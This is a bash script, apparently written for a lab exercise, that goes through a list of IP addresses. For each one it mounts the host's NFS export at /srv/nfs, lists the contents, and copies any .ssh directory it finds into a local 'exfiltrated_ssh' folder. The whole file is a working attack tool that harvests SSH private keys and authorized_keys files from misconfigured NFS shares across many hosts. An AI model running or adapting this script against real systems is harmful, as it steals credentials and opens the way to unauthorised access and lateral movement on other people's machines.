#!/bin/bash
# exploit_nfs_exfiltrate.sh
# This script mounts the NFS share from each IP in a list and exfiltrates the .ssh folder.

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <ip_list_file>"
    exit 1
fi

IP_LIST_FILE="$1"
BASE_MOUNT_DIR="/mnt/nfs_lab"
EXFIL_DIR="./exfiltrated_ssh"

# Create base directories for mounting and exfiltration
mkdir -p "$BASE_MOUNT_DIR"
mkdir -p "$EXFIL_DIR"

while read -r ip; do
    # Skip empty lines or commented lines
    [[ -z "$ip" || "$ip" =~ ^# ]] && continue
    
    TARGET_DIR="$BASE_MOUNT_DIR/$ip"
    echo "[*] Creating mount point for $ip: $TARGET_DIR"
    mkdir -p "$TARGET_DIR"
    
    echo "[*] Attempting to mount NFS share from $ip:/srv/nfs"
    # Try mounting with more verbose output
    sudo mount -t nfs "$ip":/srv/nfs "$TARGET_DIR"
    
    if [ $? -eq 0 ]; then
        echo "[+] Successfully mounted $ip:/srv/nfs to $TARGET_DIR"
        
        # Using ls -la to check all files including hidden ones
        echo "[*] Listing contents of $TARGET_DIR"
        ls -la "$TARGET_DIR"
        
        # Check if the .ssh directory exists
        if [ -d "$TARGET_DIR/.ssh" ]; then
            echo "[*] Exfiltrating .ssh folder from $ip"
            mkdir -p "$EXFIL_DIR/.ssh_$ip"
            cp -r "$TARGET_DIR/.ssh" "$EXFIL_DIR/.ssh_$ip"
            
            if [ $? -eq 0 ]; then
                echo "[+] Successfully copied .ssh folder from $ip to $EXFIL_DIR/.ssh_$ip"
            else
                echo "[-] Failed to copy .ssh folder from $ip"
            fi
        else
            echo "[-] No .ssh folder found on $ip:/srv/nfs"
        fi
        
        echo "[*] Unmounting $TARGET_DIR"
        sudo umount "$TARGET_DIR"
    else
        echo "[-] Failed to mount NFS share from $ip:/srv/nfs"
    fi
    
    echo ""
done < "$IP_LIST_FILE"